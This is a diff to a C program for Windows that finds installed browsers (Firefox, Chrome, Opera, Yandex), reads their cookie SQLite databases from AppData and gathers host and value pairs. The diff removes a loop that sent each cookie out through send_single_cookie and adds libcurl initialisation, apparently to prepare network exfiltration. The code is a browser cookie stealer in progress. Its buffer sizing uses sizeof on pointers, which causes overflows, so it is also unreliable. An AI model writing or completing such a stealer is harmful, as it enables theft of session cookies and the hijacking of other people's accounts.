@@ -13,6 +13,7 @@
 #include <dirent.h>
 #include <sqlite3.h>
 #include <windows.h>
+#include <curl/curl.h>
 
 #ifndef CH_TYPE
 #define CH_TYPE 1
@@ -55,11 +56,11 @@ int main(void)
     sprintf(roaming_path, "%sAppData\\Roaming\\", user_path);
     sprintf(local_path, "%sAppData\\Local\\", user_path);
 
-
     /* Here we'll check what browsers are installed already. */
     browser_prediction local_machine;
     local_machine = check_browsers(local_path, roaming_path);
-    local_machine.user_path = user_path;
+    local_machine.user_path = (char *)malloc(sizeof(user_path) + 1);
+    strcpy(local_machine.user_path, user_path);
 
     /* Output status for test pourpose. */
     printf("FF: %d\nCH: %d\nOP: %d\nYA: %d\n", 
@@ -70,6 +71,11 @@ int main(void)
     local_container = calloc(1, sizeof(cookies_datatype));
     collect_data(local_machine);
 
+    CURL* curl = curl_easy_init();
+    if (curl) printf("Initialised successful!!!\n");
+    else printf("Initialised, but not so successful...\n");
+    curl_easy_cleanup(curl);
+
     /* Just in case. */
     for (int i = 0; i < offset; i++)
     {
@@ -77,15 +83,6 @@ int main(void)
             i,
             local_container[i].host,
             local_container[i].value);
-    }
-
-    int status;
-    for (int i = 0; i < offset; i++)
-    {
-        status = send_single_cookie(local_container[i]);
-        printf("%d\n", status);
-        if (!status)
-            break;
     }
 
     return 0;
@@ -192,43 +189,44 @@ browser_prediction check_browsers(char* local, char* roaming)
 */
 void collect_data(browser_prediction status)
 {
-    char* u_path    = status.user_path;
-    char* full_path = (char *)malloc(sizeof(u_path) + sizeof(YA_PATH) + 1);
-    char* ff_path   = (char *)malloc((sizeof(u_path) + sizeof(FF_PATH)) * 3);
+    char* full_path = (char *)malloc(sizeof(status.user_path) + sizeof(YA_PATH) + 1);
+    char* ff_path   = (char *)malloc((sizeof(status.user_path) + sizeof(FF_PATH)) * 3);
 
     if (status.FF)
     {
-        sprintf(full_path, "%s%s", u_path, FF_PATH);
+        strcpy(full_path, status.user_path);
+        strcat(full_path, FF_PATH);
+
         strcpy(ff_path, get_ff_cookies_path(full_path));
         get_sql(ff_path, FF_TYPE);
     }
 
     if (status.CH)
     {
-        sprintf(full_path, "%s%s", u_path, CH_PATH);
+        strcpy(full_path, status.user_path);
+        strcat(full_path, CH_PATH);
         get_sql(full_path, CH_TYPE);
     }
 
     if (status.OP)
     {
-        sprintf(full_path, "%s%s", u_path, OP_PATH);
+        strcpy(full_path, status.user_path);
+        strcat(full_path, OP_PATH);
         get_sql(full_path, CH_TYPE);
     }
 
     if (status.YA)
     {
-        sprintf(full_path, "%s%s", u_path, YA_PATH);
+        strcpy(full_path, status.user_path);
+        strcat(full_path, YA_PATH);
         get_sql(full_path, CH_TYPE);
     }
-
-    free(full_path);
-    free(ff_path);
 }
 
 
 /* Callback function for SQL request to the database.
 */
-static int callback(uint8_t bt, int argc, char **argv, char **colname)
+static int callback(void* bt, int argc, char** argv, char **colname)
 {
     for (int i = 0; i < argc; i++)
     {
@@ -239,8 +237,8 @@ static int callback(uint8_t bt, int argc, char **argv, char **colname)
             strcpy(local_container[offset].value, argv[i]);
     }
 
-    local_container[offset].b_type = bt;
-    local_container = realloc(local_container, sizeof(*local_container) * (offset + 2));
+    local_container[offset].b_type = *((uint8_t *)bt);
+    local_container = realloc(local_container, sizeof(cookies_datatype) * (offset + 2));
 
     offset++;
     return 0;
@@ -268,6 +266,6 @@ void get_sql(const char* sql_path, uint8_t bt)
         return;
     }
 
-    s_code = sqlite3_exec(database, request, callback, bt, &err);
+    s_code = sqlite3_exec(database, request, callback, (void *)&bt, &err);
     sqlite3_close(database);
 }
